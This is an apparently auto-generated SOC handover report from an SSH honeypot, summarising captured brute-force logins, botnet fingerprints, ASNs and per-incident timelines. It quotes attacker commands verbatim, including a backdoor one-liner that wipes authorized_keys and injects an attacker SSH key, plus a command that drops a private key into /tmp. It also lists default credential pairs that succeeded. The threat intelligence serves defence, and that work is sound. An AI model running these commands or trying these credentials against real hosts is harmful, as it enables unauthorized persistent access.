# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-16 |
| **Generated At** | 2026-08-16T10:28:29Z |
| **Shift Time** | 10:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **4682** |
| Confirmed Threats | **4660** |
| False Positives Filtered | **22** (0.5%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **29** |
| High Severity Cases | **47** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **4635** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **18** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **61** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubnt` | 13 |
| `root` | 12 |
| `admin` | 8 |
| `config` | 7 |
| `update` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `update` | 6 |
| `cable` | 6 |
| `9999` | 6 |
| `webadmin` | 6 |
| `1234567890` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `update` | `update` | 6 |
| `blank` | `cable` | 6 |
| `admin` | `9999` | 6 |
| `ubnt` | `1234567890` | 5 |
| `ubnt` | `666666` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `centos` | `qwerty12345` | `10.0.0.73` | 2026-08-16T06:58:29 |
| `root` | `password` | `45.142.193.164` | 2026-08-16T06:59:48 |
| `ubuntu` | `P@ssw0rd` | `217.165.22.192` | 2026-08-16T07:01:38 |
| `support` | `support` | `10.0.0.73` | 2026-08-16T07:03:59 |
| `admin` | `admin` | `47.85.8.171` | 2026-08-16T07:04:12 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-16T07:04:12 |
| `root` | `Abc123456` | `10.0.0.73` | 2026-08-16T07:04:46 |
| `test` | `888888` | `10.0.0.73` | 2026-08-16T07:04:58 |
| `root` | `debian` | `203.56.201.183` | 2026-08-16T07:05:01 |
| `ubuntu` | `!QAZ2wsx#EDC` | `185.74.59.14` | 2026-08-16T07:14:53 |
| `ubnt` | `1234567890` | `10.0.0.73` | 2026-08-16T07:16:29 |
| `root` | `Huawei12#$` | `45.142.193.164` | 2026-08-16T07:18:04 |
| `ubnt` | `1234567890` | `61.2.44.54` | 2026-08-16T07:18:06 |
| `ubnt` | `1234567890` | `208.109.38.143` | 2026-08-16T07:18:14 |
| `user` | `1` | `217.165.22.192` | 2026-08-16T07:20:46 |
| `update` | `update` | `45.178.227.0` | 2026-08-16T07:20:52 |
| `update` | `update` | `175.100.107.238` | 2026-08-16T07:21:05 |
| `test` | `888888` | `187.8.120.90` | 2026-08-16T07:23:18 |
| `update` | `update` | `10.0.0.73` | 2026-08-16T07:32:27 |
| `ubnt` | `1234567890` | `60.12.5.190` | 2026-08-16T07:34:09 |
| `ubnt` | `1234567890` | `185.246.255.183` | 2026-08-16T07:34:18 |
| `root` | `001` | `10.0.0.73` | 2026-08-16T07:37:35 |
| `ubnt` | `666666` | `10.0.0.73` | 2026-08-16T07:38:40 |
| `tom` | `123` | `217.165.22.192` | 2026-08-16T07:39:53 |
| `root` | `QWE123qwe` | `45.142.193.164` | 2026-08-16T07:40:45 |
| `root` | `Gg123456789` | `171.25.158.68` | 2026-08-16T07:43:38 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.68` | 2026-08-16T07:43:40 |
| `root` | `3245gs5662d34` | `171.25.158.68` | 2026-08-16T07:43:41 |
| `support` | `support` | `176.53.159.196` | 2026-08-16T07:45:08 |
| `update` | `update` | `213.55.79.195` | 2026-08-16T07:49:36 |
| `update` | `update` | `103.158.138.179` | 2026-08-16T07:49:45 |
| `ubnt` | `pass` | `10.0.0.73` | 2026-08-16T07:50:22 |
| `ubnt` | `pass` | `63.135.169.175` | 2026-08-16T07:51:55 |
| `ubnt` | `pass` | `117.247.77.115` | 2026-08-16T07:52:04 |
| `blank` | `cable` | `222.120.176.6` | 2026-08-16T07:54:45 |
| `blank` | `cable` | `210.0.90.81` | 2026-08-16T07:54:56 |
| `ubnt` | `666666` | `211.22.222.251` | 2026-08-16T07:57:15 |
| `ubnt` | `666666` | `179.185.1.97` | 2026-08-16T07:57:24 |
| `postgres` | `postgres` | `217.165.22.192` | 2026-08-16T07:59:00 |
| `root` | `Passw0rd` | `45.142.193.164` | 2026-08-16T08:03:36 |
| `blank` | `cable` | `10.0.0.73` | 2026-08-16T08:06:23 |
| `admin` | `9999` | `10.0.0.73` | 2026-08-16T08:12:49 |
| `dspace` | `dspace` | `217.165.22.192` | 2026-08-16T08:18:08 |
| `ftpuser` | `123456` | `181.212.174.166` | 2026-08-16T08:20:59 |
| `blank` | `cable` | `211.178.165.251` | 2026-08-16T08:23:27 |
| `blank` | `cable` | `24.207.66.154` | 2026-08-16T08:23:35 |
| `config` | `webadmin` | `10.0.0.73` | 2026-08-16T08:24:24 |
| `config` | `webadmin` | `27.223.98.117` | 2026-08-16T08:26:03 |
| `root` | `Zx123456` | `45.142.193.164` | 2026-08-16T08:26:29 |
| `config` | `1qaz2wsx` | `36.64.36.101` | 2026-08-16T08:28:35 |
| `debian` | `abcd1234` | `65.20.202.4` | 2026-08-16T08:28:55 |
| `admin` | `9999` | `1.212.225.99` | 2026-08-16T08:31:09 |
| `admin` | `9999` | `122.176.45.238` | 2026-08-16T08:31:17 |
| `admin` | `9999` | `107.135.117.245` | 2026-08-16T08:31:22 |
| `admin` | `9999` | `2.55.122.202` | 2026-08-16T08:31:36 |
| `cloud` | `cloud` | `217.165.22.192` | 2026-08-16T08:37:15 |
| `ubuntu` | `P@ssWord123` | `185.74.59.14` | 2026-08-16T08:38:45 |
| `config` | `1qaz2wsx` | `10.0.0.73` | 2026-08-16T08:40:10 |
| `config` | `webadmin` | `185.15.189.232` | 2026-08-16T08:42:03 |
| `debian` | `webadmin` | `10.0.0.73` | 2026-08-16T08:46:49 |
| `root` | `root123456!` | `45.142.193.164` | 2026-08-16T08:48:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **4682** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 27 |
| Go SSH scanner | 22 |
| libssh | 11 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 27 | 27 |
| `98ddc5604ef6...` | Modern SSH client | 9 | 3 |
| `e45f2d6d7f79...` | Mirai/variant | 6 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 27 | 27 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 9 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `171.25.158.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **60** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS16629` | CTC. CORP S.A. (TELEFONICA EMPRESAS) | 2 | HIGH |
| `AS26496` | GoDaddy.com, LLC | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS24812` | RPC HomeNet Ltd. | 2 | LOW |
| `AS24444` | Shandong Mobile Communication Company Limited | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (47)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1a7fdd40e226

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 06:59 |
| **Last Seen** | 2026-08-16 07:00 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 06:59:18` | `cowrie.session.connect` |
| `2026-08-16 06:59:25` | `cowrie.client.version` |
| `2026-08-16 06:59:25` | `cowrie.client.kex` |
| `2026-08-16 06:59:48` | `cowrie.login.success` |
| `2026-08-16 07:00:03` | `cowrie.session.params` |
| `2026-08-16 07:00:03` | `cowrie.command.input` |
| `2026-08-16 07:00:08` | `cowrie.log.closed` |
| `2026-08-16 07:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd58bbc02e8

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 07:01 |
| **Last Seen** | 2026-08-16 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:01:37` | `cowrie.session.connect` |
| `2026-08-16 07:01:37` | `cowrie.client.version` |
| `2026-08-16 07:01:37` | `cowrie.client.kex` |
| `2026-08-16 07:01:38` | `cowrie.login.success` |
| `2026-08-16 07:01:39` | `cowrie.session.params` |
| `2026-08-16 07:01:39` | `cowrie.command.input` |
| `2026-08-16 07:01:39` | `cowrie.log.closed` |
| `2026-08-16 07:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b7d57f0474

| Field | Detail |
|---|---|
| **Source IP** | `203.56.201[.]183` |
| **First Seen** | 2026-08-16 07:04 |
| **Last Seen** | 2026-08-16 07:08 |
| **Session Duration** | 274s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:04:02` | `cowrie.session.connect` |
| `2026-08-16 07:04:03` | `cowrie.client.version` |
| `2026-08-16 07:04:27` | `cowrie.client.kex` |
| `2026-08-16 07:05:01` | `cowrie.login.success` |
| `2026-08-16 07:08:36` | `cowrie.session.file_upload` |
| `2026-08-16 07:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.56.201[.]183` to AbuseIPDB if not already reported
- [ ] Block `203.56.201[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8a0a684fa1

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-08-16 07:04 |
| **Last Seen** | 2026-08-16 07:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:04:12` | `cowrie.session.connect` |
| `2026-08-16 07:04:12` | `cowrie.client.version` |
| `2026-08-16 07:04:12` | `cowrie.client.kex` |
| `2026-08-16 07:04:12` | `cowrie.login.success` |
| `2026-08-16 07:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91e3d6fce1b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-16 07:04 |
| **Last Seen** | 2026-08-16 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:04:12` | `cowrie.session.connect` |
| `2026-08-16 07:04:12` | `cowrie.client.version` |
| `2026-08-16 07:04:12` | `cowrie.client.kex` |
| `2026-08-16 07:04:12` | `cowrie.login.success` |
| `2026-08-16 07:04:14` | `cowrie.session.params` |
| `2026-08-16 07:04:14` | `cowrie.command.input` |
| `2026-08-16 07:04:14` | `cowrie.session.file_download` |
| `2026-08-16 07:04:14` | `cowrie.session.file_download` |
| `2026-08-16 07:04:14` | `cowrie.log.closed` |
| `2026-08-16 07:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c216c9ca4c1

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 07:14 |
| **Last Seen** | 2026-08-16 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:14:53` | `cowrie.session.connect` |
| `2026-08-16 07:14:53` | `cowrie.client.version` |
| `2026-08-16 07:14:53` | `cowrie.client.kex` |
| `2026-08-16 07:14:53` | `cowrie.login.success` |
| `2026-08-16 07:14:54` | `cowrie.session.params` |
| `2026-08-16 07:14:54` | `cowrie.command.input` |
| `2026-08-16 07:14:54` | `cowrie.log.closed` |
| `2026-08-16 07:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73818e258ac3

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 07:17 |
| **Last Seen** | 2026-08-16 07:18 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:17:35` | `cowrie.session.connect` |
| `2026-08-16 07:17:42` | `cowrie.client.version` |
| `2026-08-16 07:17:42` | `cowrie.client.kex` |
| `2026-08-16 07:18:04` | `cowrie.login.success` |
| `2026-08-16 07:18:17` | `cowrie.session.params` |
| `2026-08-16 07:18:17` | `cowrie.command.input` |
| `2026-08-16 07:18:21` | `cowrie.log.closed` |
| `2026-08-16 07:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314cbaf296a7

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-16 07:18 |
| **Last Seen** | 2026-08-16 07:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:18:03` | `cowrie.session.connect` |
| `2026-08-16 07:18:04` | `cowrie.client.version` |
| `2026-08-16 07:18:04` | `cowrie.client.kex` |
| `2026-08-16 07:18:06` | `cowrie.login.success` |
| `2026-08-16 07:18:07` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:18:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb54f59c250

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-08-16 07:18 |
| **Last Seen** | 2026-08-16 07:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:18:12` | `cowrie.session.connect` |
| `2026-08-16 07:18:13` | `cowrie.client.version` |
| `2026-08-16 07:18:13` | `cowrie.client.kex` |
| `2026-08-16 07:18:14` | `cowrie.login.success` |
| `2026-08-16 07:18:14` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f43e133c82

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 07:20 |
| **Last Seen** | 2026-08-16 07:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:20:45` | `cowrie.session.connect` |
| `2026-08-16 07:20:45` | `cowrie.client.version` |
| `2026-08-16 07:20:45` | `cowrie.client.kex` |
| `2026-08-16 07:20:46` | `cowrie.login.success` |
| `2026-08-16 07:20:47` | `cowrie.session.params` |
| `2026-08-16 07:20:47` | `cowrie.command.input` |
| `2026-08-16 07:20:47` | `cowrie.log.closed` |
| `2026-08-16 07:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e23af9e8e0

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-16 07:20 |
| **Last Seen** | 2026-08-16 07:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:20:50` | `cowrie.session.connect` |
| `2026-08-16 07:20:50` | `cowrie.client.version` |
| `2026-08-16 07:20:50` | `cowrie.client.kex` |
| `2026-08-16 07:20:52` | `cowrie.login.success` |
| `2026-08-16 07:20:53` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a816576d4f3e

| Field | Detail |
|---|---|
| **Source IP** | `175.100.107[.]238` |
| **First Seen** | 2026-08-16 07:21 |
| **Last Seen** | 2026-08-16 07:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:21:02` | `cowrie.session.connect` |
| `2026-08-16 07:21:03` | `cowrie.client.version` |
| `2026-08-16 07:21:03` | `cowrie.client.kex` |
| `2026-08-16 07:21:05` | `cowrie.login.success` |
| `2026-08-16 07:21:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.100.107[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.100.107[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f01b5504e63

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-16 07:23 |
| **Last Seen** | 2026-08-16 07:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:23:15` | `cowrie.session.connect` |
| `2026-08-16 07:23:16` | `cowrie.client.version` |
| `2026-08-16 07:23:16` | `cowrie.client.kex` |
| `2026-08-16 07:23:18` | `cowrie.login.success` |
| `2026-08-16 07:23:19` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21aecad8dfdc

| Field | Detail |
|---|---|
| **Source IP** | `60.12.5[.]190` |
| **First Seen** | 2026-08-16 07:34 |
| **Last Seen** | 2026-08-16 07:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:34:05` | `cowrie.session.connect` |
| `2026-08-16 07:34:07` | `cowrie.client.version` |
| `2026-08-16 07:34:07` | `cowrie.client.kex` |
| `2026-08-16 07:34:09` | `cowrie.login.success` |
| `2026-08-16 07:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.12.5[.]190` to AbuseIPDB if not already reported
- [ ] Block `60.12.5[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99d5e19bfd1c

| Field | Detail |
|---|---|
| **Source IP** | `185.246.255[.]183` |
| **First Seen** | 2026-08-16 07:34 |
| **Last Seen** | 2026-08-16 07:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:34:16` | `cowrie.session.connect` |
| `2026-08-16 07:34:16` | `cowrie.client.version` |
| `2026-08-16 07:34:16` | `cowrie.client.kex` |
| `2026-08-16 07:34:18` | `cowrie.login.success` |
| `2026-08-16 07:34:19` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.246.255[.]183` to AbuseIPDB if not already reported
- [ ] Block `185.246.255[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645470866b0b

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 07:39 |
| **Last Seen** | 2026-08-16 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:39:52` | `cowrie.session.connect` |
| `2026-08-16 07:39:52` | `cowrie.client.version` |
| `2026-08-16 07:39:52` | `cowrie.client.kex` |
| `2026-08-16 07:39:53` | `cowrie.login.success` |
| `2026-08-16 07:39:54` | `cowrie.session.params` |
| `2026-08-16 07:39:54` | `cowrie.command.input` |
| `2026-08-16 07:39:54` | `cowrie.log.closed` |
| `2026-08-16 07:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d8703933d71

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 07:40 |
| **Last Seen** | 2026-08-16 07:41 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

